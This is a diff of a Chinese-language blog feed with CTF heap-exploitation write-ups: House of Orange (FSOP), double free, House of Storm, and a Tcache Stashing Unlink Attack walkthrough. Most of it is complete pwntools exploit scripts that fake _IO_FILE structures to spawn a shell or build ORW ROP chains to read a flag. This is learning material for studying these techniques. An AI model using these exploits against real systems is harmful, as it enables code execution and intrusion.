+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake_file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p>
+<p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p>
+<pre><code>dbg()
+payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
+fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
+fake_file += p64(0)+p64(io_list_all-0x10)
+fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
+fake_file = fake_file.ljust(0xc0,'\x00')
+fake_file += p64(0) * 3
+fake_file += p64(heap_base+0x5E8) #vtable ptr
+fake_file += p64(0) * 2
+fake_file += p64(system)
+payload += fake_file
+edit(len(payload), payload)
+dbg()
+</code></pre>
+<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p>
+<pre><code>ru("Your choice : ")
+sl('1')
+itr()
+</code></pre>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8
+from pwn import  *
+ 
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+ 
+binary = './houseoforange_hitcon_2016'  
+#sh = process(binary) #连接本地程序
+sh = remote('node4.buuoj.cn',26188) #连接远程程序
+elf = ELF(binary)     
+libc = ELF('../../libc-2.23.so--64')  
+
+#libc-2.23.so--64
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget[0] = 0x45216
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims  :sh.recvuntil(delims )
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg=lambda address,data:log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+def add(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('1')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name :")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+def show():
+    ru("Your choice : ")
+    sl('2')
+
+def edit(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('3')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name:")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+
+add(0x30,'aaaa\n')
+#dbg()
+payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)
+ 
+edit(len(payload), payload)
+#dbg()
+add(0x1000, 'a\n')
+#dbg()
+add(0x400, 'a' * 8)
+#dbg()
+show()
+ru('a'*8)
+libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
+lg('libc.address',libc.address)
+  
+io_list_all = libc.symbols['_IO_list_all']
+system = libc.symbols['system']
+
+payload = 'b' * 0x10
+ 
+
+edit(0x10, payload)
+
+show()
+ru('b'*0x10)
+heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
+heap_base = heap - 0xE0
+lg('heap_base',heap_base)
+#dbg()
+ 
+payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
+fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
+fake_file += p64(0)+p64(io_list_all-0x10)
+fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
+fake_file = fake_file.ljust(0xc0,'\x00')
+fake_file += p64(0) * 3
+fake_file += p64(heap_base+0x5E8) #vtable ptr
+fake_file += p64(0) * 2
+fake_file += p64(system)
+payload += fake_file
+edit(len(payload), payload)
+#dbg()
+ 
+ru("Your choice : ")
+sl('1')
+
+itr()
+</code></pre>
+<p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>参考文章<br><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>House of 系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>doublefree</title>
+    <url>/2023/04/10/double%20free/</url>
+    <content><![CDATA[<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
+<p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
+</blockquote>
+<p>该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：</p>
+<pre><code>free(shangu1)
+free(shangu2)
+free(shangu1)
+</code></pre>
+<p>此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1<br>当再次申请堆时会出现 有两个指针指向同一个chunk</p>
+<p>![联想截图_20230322221849.png](<a href="https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png">https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png</a></p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>House of Storm</title>
     <url>/2023/04/10/House%20of%20Storm/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p>
+    <content><![CDATA[<h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p>
 <h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h2><pre><code>1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，
   这两个chunk需要在归位之后处于同一个largebin的index中，
   且unsortedbin中的chunk要比largebin中的大
@@ -2262,577 +3720,8 @@ itr()
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/09/11/double%20free/</url>
-    <content><![CDATA[<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
-<p>1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
-</blockquote>
-<p>该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：</p>
-<pre><code>free(shangu1)
-free(shangu2)
-free(shangu1)
-</code></pre>
-<p>此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1<br>当再次申请堆时会出现 有两个指针指向同一个chunk</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/09/11/Tcache%20Stashing%20Unlink%20Attack(House%20of%20Lore%20Attack)/</url>
-    <content><![CDATA[<p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p>
-<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><blockquote>
-<p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
-</blockquote>
-<h1 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h1><blockquote>
-<p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p>
-</blockquote>
-<p>利用前提</p>
-<pre><code>1.能控制 Small Bin Chunk 的 bk 指针。
-
-2.程序可以越过Tache取Chunk。(使用calloc即可做到)
-
-3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。
-</code></pre>
-<h1 id="例题-BUUCTF-2020-新春红包题-3"><a href="#例题-BUUCTF-2020-新春红包题-3" class="headerlink" title="例题 BUUCTF-[2020 新春红包题]3"></a>例题 BUUCTF-[2020 新春红包题]3</h1><p class='item-img' data-src='https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/1e5652dfa82c4d62aa48c5dfde30cbd7.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>未开启canary保护，可能存在栈溢出</p>
-<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p>程序实现四个功能，增，删，查，改，还有一个栈溢出的函数</p>
-<pre><code>void __fastcall __noreturn main(char *a1, char **a2, char **a3)
-{
-  char v3[268]; // [rsp+0h] [rbp-110h] BYREF
-  int v4; // [rsp+10Ch] [rbp-4h]
-
-  v4 = 0;
-  sub_11D5();
-  sub_1450();
-  sub_1269();
-  while ( 1 )
-  {
-    while ( 1 )
-    {
-      while ( 1 )
-      {
-        menu();
-        v4 = readd();
-        if ( v4 != 3 )
-          break;
-        a1 = v3;
-        edit(v3, a2);
-      }
-      if ( v4 &gt; 3 )
-        break;
-      if ( v4 == 1 )
-      {
-        if ( x1c &lt;= 0 )
-          exitt();
-        a1 = v3;
-        add(v3);
-        --x1c;
-      }
-      else
-      {
-        if ( v4 != 2 )
-          goto LABEL_19;
-        a1 = v3;
-        delete(v3);
-      }
-    }
-    if ( v4 == 5 )
-      exitt();
-    if ( v4 &lt; 5 )
-    {
-      a1 = v3;
-      show(v3);
-    }
-    else
-    {
-      if ( v4 != 666 )
-LABEL_19:
-        exitt();
-      stack_attack(a1, a2);
-    }
-  }
-}
-</code></pre>
-<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。</p>
-<pre><code>int __fastcall sub_1515(__int64 a1)
-{
-  int v2; // [rsp+10h] [rbp-20h]
-  int v3; // [rsp+14h] [rbp-1Ch]
-  unsigned int v4; // [rsp+18h] [rbp-18h]
-  int size; // [rsp+1Ch] [rbp-14h]
-
-  printf("Please input the red packet idx: ");
-  v4 = readd();
-  if ( v4 &gt; 0x10 )
-    exitt();
-  printf("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ");
-  v3 = readd();
-  if ( v3 == 2 )
-  {
-    size = 0xF0;
-  }
-  else if ( v3 &gt; 2 )
-  {
-    if ( v3 == 3 )
-    {
-      size = 0x300;
-    }
-    else
-    {
-      if ( v3 != 4 )
-        goto LABEL_14;
-      size = 0x400;
-    }
-  }
-  else
-  {
-    if ( v3 != 1 )
-    {
-LABEL_14:
-      size = 0;
-      goto LABEL_15;
-    }
-    size = 16;
-  }
-LABEL_15:
-  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )
-    exitt();
-  *(16LL * v4 + a1) = calloc(1uLL, size);
-  *(a1 + 16LL * v4 + 8) = size;
-  printf("Please input content: ");
-  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));
-  if ( v2 &lt;= 0 )
-    exitt();
-  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;
-  return puts("Done!");
-}
-</code></pre>
-<h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p>存在UAF</p>
-<pre><code>int __fastcall delete(__int64 a1)
-{
-  unsigned int v2; // [rsp+1Ch] [rbp-4h]
-
-  printf("Please input the red packet idx: ");
-  v2 = readd();
-  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
-    exitt();
-  free(*(16LL * v2 + a1));                      // uaf
-                                                // 
-  return puts("Done!");
-}
-</code></pre>
-<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次</p>
-<pre><code>int __fastcall sub_1740(__int64 a1, __int64 a2)
-{
-  void *v2; // rsi
-  int v4; // [rsp+18h] [rbp-8h]
-  unsigned int v5; // [rsp+1Ch] [rbp-4h]
-
-  if ( qword_4010 &lt;= 0 )
-    exitt(a1, a2);
-  --qword_4010;
-  printf("Please input the red packet idx: ");
-  v5 = readd();
-  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )
-    exitt("Please input the red packet idx: ", a2);
-  printf("Please input content: ");
-  v2 = *(16LL * v5 + a1);
-  v4 = read(0, v2, *(16LL * v5 + a1 + 8));
-  if ( v4 &lt;= 0 )
-    exitt(0LL, v2);
-  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;
-  return puts("Done!");
-}
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/01aa83610d4643709ea878d55a3f47e1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int __fastcall sub_184E(__int64 a1)
-{
-  unsigned int v2; // [rsp+1Ch] [rbp-4h]
-
-  printf("Please input the red packet idx: ");
-  v2 = readd();
-  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )
-    exitt();
-  puts(*(16LL * v2 + a1));
-  return puts("Done!");
-}
-</code></pre>
-<h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p>
-<pre><code>ssize_t sub_13BD()
-{
-  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
-
-  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )
-    exitt();
-  puts("You get red packet!");
-  printf("What do you want to say?");
-  return read(0, buf, 0x90uLL);
-}
-</code></pre>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p>
-<h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p>
-<pre><code># coding=utf-8
-from pwn import *
-context(endian='little',os='linux',arch='amd64',log_level='debug') 
-
-sh = process('./RedPacket_SoEasyPwn1')
-#sh = remote('node4.buuoj.cn','27283')
-
-libc=ELF("./libc-2.29.so")
-
- 
- 
-
-s       = lambda data               :sh.send(data)
-sa      = lambda delim,data         :sh.sendafter(delim, data)
-sl      = lambda data               :sh.sendline(data)
-sla     = lambda delim,data         :sh.sendlineafter(delim, data)
-r       = lambda num=4096           :sh.recv(num)
-ru      = lambda delims		    :sh.recvuntil(delims)
-itr     = lambda                    :sh.interactive()
-uu32    = lambda data               :u32(data.ljust(4,'\0'))
-uu64    = lambda data               :u64(data.ljust(8,'\0'))
-leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
-lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
-def dbg():
-        gdb.attach(sh)
-        pause()
- 
-
-def add(index,chunk_size_index,value):
-    ru('Your input: ')
-    sl('1')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
-    sl(str(chunk_size_index))
-    ru('Please input content: ')
-    sl(value)
-
-def free(index):
-    ru('Your input: ')
-    sl('2')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-
-def edit(index,value):
-    ru('Your input: ')
-    sl('3')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-    ru('Please input content: ')
-    sl(value)
-
-def show(index):
-    ru('Your input: ')
-    sl('4')
-    ru('Please input the red packet idx: ')
-    sl(str(index))
-</code></pre>
-<h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p>
-<pre><code>#1.0x10 2.0xf0 3.0x300 4.0x400
-for i in range(7):
-    add(15,4,'Chunk_15')
-    free(15)
-
-for i in range(6):
-    add(14,2,'Chunk_14')
-    free(14)
-
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p>
-<pre><code>show(15)
-last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
-lg('last_chunk_addr',last_chunk_addr)
-heap_addr = last_chunk_addr - 0x26C0
-lg('heap_addr',heap_addr)
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote>
-<p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p>
-</blockquote>
-<p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p>
-<p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p>
-<pre><code>add(1,4,'Chunk_1')
-add(13,3,'Chunk_13')
-
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p>
-<pre><code>free(1)
-show(1)
-libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
-lg('libc_base',libc_base)
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p>
-<pre><code>add(13,3,'Chunk_13')
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p>
-<pre><code>add(13,3,'Chunk_13')
-
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p>
-<pre><code>add(2,4,'Chunk_2')
-add(13,4,'Chunk_13')
-
-#dbg()
-
-free(2)
-
-#dbg()
-
-add(13,3,'Chunk_13')
-add(13,3,'Chunk_13')
-
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p>
-<h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><pre><code>payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
-edit(2,payload)
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p>
-<pre><code>pop_rdi_ret = libc_base + 0x0000000000026542
-pop_rsi_ret = libc_base + 0x0000000000026f9e
-pop_rdx_ret = libc_base + 0x000000000012bda6
-file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
-flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
-ROP_chain  = '/flag\x00\x00\x00'
-</code></pre>
-<p>open(file_name_addr,0)</p>
-<pre><code>ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(file_name_addr)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(0)
-ROP_chain += p64(libc_base+libc.symbols['open'])
-</code></pre>
-<p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p>
-<pre><code>ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(3)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(flag_addr)
-ROP_chain += p64(pop_rdx_ret)
-ROP_chain += p64(0x40)
-ROP_chain += p64(libc_base+libc.symbols['read'])
-</code></pre>
-<p>write(1,flag_addr,0x40)</p>
-<pre><code>ROP_chain += p64(pop_rdi_ret)
-ROP_chain += p64(1)
-ROP_chain += p64(pop_rsi_ret)
-ROP_chain += p64(flag_addr)
-ROP_chain += p64(pop_rdx_ret)
-ROP_chain += p64(0x40)
-ROP_chain += p64(libc_base+libc.symbols['write'])
-</code></pre>
-<p>申请chunk，将ROP链写到chunk里</p>
-<pre><code>add(4,4,ROP_chain)
-
-dbg()
-</code></pre>
-<p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
-<pre><code>leave_ret = libc_base + 0x0000000000058373
-ru('Your input: ')
-sl('666')
-ru('What do you want to say?')
-#栈迁移
-sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
-
-itr()
-</code></pre>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
-from pwn import *
-context(endian='little',os='linux',arch='amd64',log_level='debug') 
-
-sh = process('./RedPacket_SoEasyPwn1')
-#sh = remote('node4.buuoj.cn','27283')
-
-libc=ELF("./libc-2.29.so")
-
- 
- 
-
-s       = lambda data               :sh.send(data)
-sa      = lambda delim,data         :sh.sendafter(delim, data)
-sl      = lambda data               :sh.sendline(data)
